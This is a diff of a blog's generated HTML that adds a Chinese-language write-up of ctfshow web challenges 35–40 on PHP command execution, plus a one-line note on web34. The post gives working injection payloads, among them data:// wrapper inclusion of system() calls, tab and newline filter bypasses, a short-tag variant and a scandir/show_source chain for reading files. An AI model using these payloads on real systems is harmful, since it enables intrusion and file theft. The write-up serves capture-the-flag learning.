@@ -69,6 +69,136 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ctfshow-web入门-命令篇(二)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/" class="article-date">
+  <time class="dt-published" datetime="2025-01-23T05:18:52.000Z" itemprop="datePublished">2025-01-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/">命令执行(web35-)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>                                                                                         ctfshow web入门 命令篇(二)</p>
+<p><strong>web35</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791d69a4b4a8.png" title alt style="zoom:33%;">
+
+<p>解法一:与web34相同</p>
+<p>解法二:用data协议 模板:<strong>data:text&#x2F;plain,<?php system("命令");?></strong></p>
+<p>本题用:</p>
+<p><strong>?c&#x3D;include%09$_POST[a]?&gt;    POST:a&#x3D;data:text&#x2F;plain,<?php system('tac fla*');?></strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791d80302bab.png" title alt style="zoom:50%;">
+
+
+
+
+
+
+
+<p><strong>web36</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791d991e9cf3.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/23/6791d9e5bd485.png"></p>
+<p>发现过滤了0-9数字把空格从**%09<strong>改为</strong>%0a**</p>
+<p>如<img title src="https://www.helloimg.com/i/2025/01/23/6791da6922106.png" alt style="zoom:33%;"></p>
+<p><strong>web37</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791de18dea46.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/23/6791df5e1ff03.png"></p>
+<p>和前面的题差不多  直接用data或php协议绕过  推荐用data协议(因为不用后续解码)</p>
+<p>?c&#x3D;data:text&#x2F;plain,<?php system("tac fla*");?></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791df849b2a0.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+<p><strong>web38</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791e1dde0570.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/23/6791e21c34705.png"></p>
+<p>发现过滤多了PHP和file导致标准的data无法使用  但可以使用简写版(把php改为&#x3D;)</p>
+<p>简写版:<strong>data:text&#x2F;plain,<?=system("命令");?></strong></p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791e2c141609.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>web39</strong></p>
+<p>和前面的题一样的解法</p>
+<p><code>include($c.&quot;.php&quot;);</code>含义是在变量c的值后添加.php  对data协议无意义</p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791e57bc4b9c.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+<p><strong>web40</strong></p>
+<p><strong>localeconv()</strong>:返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)</p>
+<p><strong>pos()</strong>:返回数组中的当前元素的值。current()与其相似。</p>
+<p><strong>scandir()</strong>:获取目录下的文件。</p>
+<p><strong>array_reverse()</strong>:数组逆序。</p>
+<p><strong>next()</strong>:函数将内部指针指向数组中的下一个元素，并输出。</p>
+<p><strong>print_r()</strong>:函数用于打印变量，作用对象是变量。</p>
+<p><strong>show_source()</strong>:对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，作用对象是文件。</p>
+<p><strong>highlight_file()</strong>:跟show_source()类似。</p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791ee17765cb.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/23/6791ee3ac75eb.png"></p>
+<p>仔细看会发现过滤的()是中文的   所以相当于没过滤</p>
+<p>?c&#x3D;print_r(scandir(pos(localeconv())));以数组的形式展现目录</p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791eedec43ce.png" title alt style="zoom:33%;">
+
+<p>?c&#x3D;print_r((array_reverse(scandir(current(localeconv())))));将目录反转</p>
+<img src="https://www.helloimg.com/i/2025/01/23/6791ef3f47730.png" title alt style="zoom:33%;">
+
+<p>?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));显示数组1的高亮文字  得到flag</p>
+<p><img src="https://www.helloimg.com/i/2025/01/23/6791ef5f7cf06.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/" data-id="cm690nxk900004wcxaqxu082j" data-title="命令执行(web35-)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ctfshow-web入门-命令篇(一)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/" class="article-date">
@@ -136,6 +266,8 @@
 <p><img src="https://www.helloimg.com/i/2025/01/21/678f66b028a14.png" title alt style="zoom:33%;"><img src="https://www.helloimg.com/i/2025/01/21/678f66cea8227.png" title alt style="zoom:33%;"></p>
 <p>解码后得到flag</p>
 <p><img src="https://www.helloimg.com/i/2025/01/21/678f674a89c80.png"></p>
+<p><strong>web34</strong></p>
+<p>参考<strong>web33</strong>  一模一样</p>
 
       
     </div>
@@ -487,6 +619,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/">命令执行(web35-)</a>
+          </li>
         
           <li>
             <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/">命令执行</a>
